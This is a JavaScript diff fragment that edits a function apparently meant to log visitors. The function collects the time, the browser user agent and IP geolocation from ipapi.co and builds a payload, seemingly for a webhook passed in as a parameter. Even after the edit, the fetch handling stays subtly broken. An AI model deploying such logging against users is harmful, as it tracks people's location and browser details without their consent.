@@ -5,7 +5,7 @@ async function getData(webhookurl){
     const time = new Date().toLocaleTimeString();
     const bDetails=navigator.userAgent;
     const geolocdata = [];
-    const fetchGeoLocData = fetch("https://ipapi.co/json/").then((response) => response.json(), geolocdata.push(response.json()) );
+    const fetchGeoLocData = fetch("https://ipapi.co/json/").then(response => geolocdata.push(response.json()));
     console.log(geolocdata);
     const payload={
         "content": "Information",
